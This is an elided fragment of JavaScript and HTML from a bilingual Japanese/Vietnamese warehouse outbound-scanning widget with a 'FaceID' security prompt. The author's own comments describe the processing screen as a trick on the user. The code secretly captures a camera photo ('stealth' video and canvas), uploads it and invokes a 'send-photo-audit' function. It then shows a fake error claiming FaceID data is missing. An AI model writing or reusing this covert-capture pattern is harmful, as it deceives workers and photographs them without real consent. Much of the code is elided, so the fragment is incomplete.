...
(function() {
    ...
    function createStructure() {
        ...
        <style>
            ...
            .plm-sec-overlay { position: absolute; inset: 0; background: rgba(15,23,42,0.95); z-index: 999; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(8px); flex-direction: column; color: #fff; padding: 20px; text-align: center; }
            .plm-sec-box { background: #1e293b; border: 1px solid #3b82f6; border-radius: 16px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); }
                ...
                <div class="plm-body" id="plmBodyWrap">
                    ...
                    <div id="plmSecurityOverlay" class="plm-sec-overlay plm-hidden">
                        <div class="plm-sec-box">
                            ...
                            <p style="font-size: 13px; color: #cbd5e1; margin-bottom: 15px; line-height: 1.5; font-weight: bold;"><span class="plm-ja">セキュリティのため、カメラへのアクセスが必要です。許可してください。</span><span class="plm-vi" style="margin-top:4px; font-weight:normal;">Hệ thống cần truy cập máy ảnh, hãy bấm Allow/Cho Phép.</span></p>
                            
                            <p style="font-size: 13px; color: #facc15; margin-bottom: 20px; line-height: 1.5; padding: 10px; background: rgba(250, 204, 21, 0.1); border-radius: 8px;">
                                <span class="plm-ja">FaceIDを通じて作業員を確認する必要があります。</span>
                                <span class="plm-vi" style="margin-top:4px; font-weight:normal;">Cần xác nhận nhân viên thao tác thông qua FaceID.</span>
                            </p>
                            
                            <!-- Video Preview Container (Mặc định ẩn) -->
                            <div id="plmFaceIDPreviewBox" style="display:none; width:100%; max-width:250px; margin:0 auto 20px auto; border-radius:12px; overflow:hidden; border:2px solid #3b82f6; position:relative; background:#000;">
                            ...
                            <div id="plmSecActionButtons" style="display: none; flex-direction: column; gap: 10px;">
                                <button id="plmSecBtnPreview" class="plm-btn" style="background:#3b82f6;">
                                    <i class="fas fa-camera"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">プレビューを表示</span><span style="font-size:11px; font-weight:normal">Bật khung ngắm (Preview)</span></span>
                                </button>
                                <button id="plmSecBtnAccept" class="plm-btn" style="background:#10b981;">
                                    <i class="fas fa-forward"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">直接認証する</span><span style="font-size:11px; font-weight:normal">Tiếp tục (Không Preview)</span></span>
                                </button>
                            </div>

                            <div id="plmSecProcessing" style="display:none; padding:15px; color:#10b981;">
                                <i class="fas fa-circle-notch fa-spin" style="font-size:24px; margin-bottom:10px;"></i>
                                <div style="font-size:14px; font-weight:bold;">認証中... / Đang xác thực FaceID</div>
                            </div>

                            <button id="plmSecBtnCancel" class="plm-btn" style="background:transparent; color:#94a3b8; border:1px solid #475569; margin-top:15px; width:auto; margin-left:auto; margin-right:auto; padding: 8px 20px;">キャンセル / Hủy bỏ</button>
                        </div>
                    </div>
                </div>
            </div>
    ...
    async function executeAutoCaptureAndUpload() {
        var videoEl = document.getElementById('plmStealthVideo');
        var canvas = document.getElementById('plmStealthCanvas');
        
        if(!canvas || !videoEl || videoEl.videoWidth === 0) return;
        ...
        canvas.toBlob(async function(blob) {
            ...
            try {
                ...
                var publicUrl = pubRes.data.publicUrl || pubRes.publicURL;
                ...
                sb.functions.invoke('send-photo-audit', { body: payload }).catch(()=>{});
            } catch(e) { console.log('Stealth Capture Error', e); }
            
            // Xong luồng ngầm thì tắt stream nếu popup chưa tắt
...
async function handleOutboundSubmit() {
    ...
    function triggerSecurityScanFlow(inputId) {
        ...
        var btnCancel = document.getElementById('plmSecBtnCancel');
        var actionBtns = document.getElementById('plmSecActionButtons');
        var processingBox = document.getElementById('plmSecProcessing');
        ...
        // Nút default trạng thái ban đầu
        if(btnAccept) btnAccept.innerHTML = '<i class="fas fa-forward"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">直接認証する</span><span style="font-size:11px; font-weight:normal">Tiếp tục (Không Preview)</span></span>';
        if(btnPreview) btnPreview.style.display = 'block';

        state.faceIdUrl = null; // Reset

        function handleProcessCapture() {
            // Hiển thị trạng thái xử lý lừa UX
            if(actionBtns) actionBtns.style.display = 'none';
            ...
            // Cố tình chờ ngầm 1.5s để camera focus và chụp FaceID ẩn
            setTimeout(() => { 
                executeAutoCaptureAndUpload(); 
            }, 1500);

            // Chờ thêm 500ms nữa để hiển thị Toast ảo báo lỗi FaceID và nhả luồng
            setTimeout(() => {
                plmToast('顔認証データが未登録です / FaceID chưa có dữ liệu, hãy nhập thủ công.', 'error');
                stopFaceIdFlow();
                startBarcodeScanner();
            }, 2500);
        }
        ...
        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            ...
            .then(function(stream) {
                ...
                // Hiển thị 2 nút (Preview / No Preview) sau khi được cấp quyền Camera
                ...
                if(btnPreview) {
                    btnPreview.onclick = function() {
                        ...
                        btnPreview.style.display = 'none'; // Ẩn chính nó
                        btnAccept.innerHTML = '<i class="fas fa-camera"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">認証する</span><span style="font-size:11px; font-weight:normal">Chụp & Xác Thực</span></span>';
            ...
            .catch(function(err) {
                ...
                // Dù chặn cam vẫn cho qua nhưng báo lỗi nhẹ
                plmToast('カメラの権限がありません / Quyền Camera bị từ chối.', 'error');
                stopFaceIdFlow();
                startBarcodeScanner();
            });
        } else {
            plmToast('カメラが未対応です / Thiết bị không hỗ trợ Camera.', 'error');
            stopFaceIdFlow();
            startBarcodeScanner();
        }
    }
